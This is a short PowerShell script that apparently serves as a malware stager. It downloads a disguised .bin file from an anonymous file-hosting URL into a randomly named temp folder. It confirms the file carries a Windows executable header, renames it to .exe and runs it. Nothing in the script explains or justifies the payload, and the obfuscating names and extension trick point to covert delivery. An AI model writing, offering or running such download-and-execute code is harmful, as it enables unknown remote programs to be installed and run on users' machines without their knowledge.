$DownloadUrl = 'https://files.catbox.moe/4xqxve.bin'

$TempDir = Join-Path $env:TEMP 'whajdmm_nig_ga_67'
$DownloadedFile = Join-Path $TempDir 'resfwefsc.exe.bin'
$ExePath = Join-Path $TempDir 'resfwefsc.exe'

$ErrorActionPreference = 'Stop'
$ExitCode = 1

try {
    New-Item -ItemType Directory -Path $TempDir -Force |
        Out-Null

    # Download file
    Invoke-WebRequest `
        -Uri $DownloadUrl `
        -OutFile $DownloadedFile `
        -UseBasicParsing

    # Verify the file exists and has an EXE header
    $Stream = [System.IO.File]::OpenRead($DownloadedFile)

    try {
        $Header = New-Object byte[] 2
        $Read = $Stream.Read($Header, 0, 2)
    }
    finally {
        $Stream.Dispose()
    }

    if ($Read -ne 2 -or
        $Header[0] -ne 0x4D -or
        $Header[1] -ne 0x5A) {
        throw 'Downloaded file is not a valid Windows EXE.'
    }

    # Remove the .bin extension
    Move-Item -LiteralPath $DownloadedFile `
        -Destination $ExePath -Force

    # Run with all arguments supplied to this script
    & $ExePath @args

    $ExitCode = $LASTEXITCODE
}
catch {
    Write-Error $_
    $ExitCode = 1
}

# Exit after the program finishes
exit $ExitCode
